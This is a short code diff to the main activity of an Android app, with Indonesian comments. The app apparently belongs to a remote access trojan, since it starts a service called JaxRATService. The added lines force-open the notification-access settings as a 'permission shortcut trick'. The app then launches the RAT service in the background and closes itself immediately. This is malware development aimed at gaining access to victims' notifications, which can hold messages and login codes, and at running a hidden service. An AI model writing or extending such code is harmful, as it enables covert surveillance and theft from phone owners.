@@ -27,7 +27,16 @@ public class MainActivity extends Activity {
                 startActivityForResult(intent, 102);
             }
         }
-        
+
+        // --- JURUS SHORTCUT IZIN NOTIFIKASI ---
+        // Buka menu pengaturan Akses Notifikasi secara paksa
+        try {
+            Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
+            startActivity(intent);
+        } catch (Exception e) {
+            // Kalau HP-nya nggak support shortcut, abaikan
+        }
+
         // Jalankan Service
         Intent serviceIntent = new Intent(this, JaxRATService.class);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -36,6 +45,6 @@ public class MainActivity extends Activity {
             startService(serviceIntent);
         }
         
-        finish();
+        finish(); // Tutup aplikasi
     }
 }
